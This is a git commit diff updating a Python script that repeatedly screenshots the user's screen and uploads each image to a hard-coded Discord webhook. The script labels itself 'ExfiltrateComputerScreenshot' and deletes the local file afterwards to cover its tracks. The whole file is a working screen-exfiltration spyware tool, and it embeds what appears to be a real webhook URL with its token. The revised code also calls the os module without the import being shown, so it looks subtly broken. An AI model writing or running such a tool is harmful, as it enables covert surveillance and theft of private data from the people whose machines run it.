f4fe0f838e03dd78013ab26383a575f1ebadedc6
Jolly-mod <65080568+Jolly-mod@users.noreply.github.com>
2024-06-21 04:57:06 -0400

    Update script.py

--- script.py
+++ script.py
@@ -2,33 +2,38 @@ import pyautogui
 from time import sleep
 import requests
 
-
 # YOUR DISCORD WEBHOOK
 discord_webhook = "https://discord.com/api/webhooks/1253602240309231670/gX27PAtX98r7wBg3WUAGl14xH6S3aO02o7sU8cuCQlS-CbtdEKpaRwaUM65FKfh2piy0"
 
-# Edit this variables as you want
-SCREENSHOTS = 10
-TIMING = 1
+# Edit these variables as you want
+SCREENSHOTS = 10  # Number of screenshots to take
+TIMING = 1  # Interval between screenshots in seconds
 
 for i in range(SCREENSHOTS):
     sleep(TIMING)
 
-    # take the screenshot
+    # Take the screenshot
     screenshot = pyautogui.screenshot()
     screenshot.save("screenshot.png")
 
-    with open("screenshot.png", "rb") as f:
-        foto = f.read()
-
-    richiesta = {
+    # Prepare the request payload
+    payload = {
         "username": "ExfiltrateComputerScreenshot"
     }
 
-    # Send the message by attaching the photo
-    response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})
+    # Open and read the screenshot file
+    with open("screenshot.png", "rb") as f:
+        files = {"file": f}  # Replace "file" with the appropriate key for Discord
 
-    # Useful for debugging
-    # if response.status_code == 200:
-    #     print("Photo successfully sent!")
-    # else:
-    #     print("Error while submitting photo." + str(response.status_code))
+        # Send the message by attaching the photo
+        response = requests.post(discord_webhook, data=payload, files=files)
+
+        # Useful for debugging
+        if response.status_code == 200:
+            print(f"Screenshot {i+1}/{SCREENSHOTS} successfully sent to Discord!")
+        else:
+            print(f"Error while sending screenshot {i+1}/{SCREENSHOTS}. Status code: {response.status_code}")
+
+    # Clean up the screenshot file
+    if os.path.exists("screenshot.png"):
+        os.remove("screenshot.png")
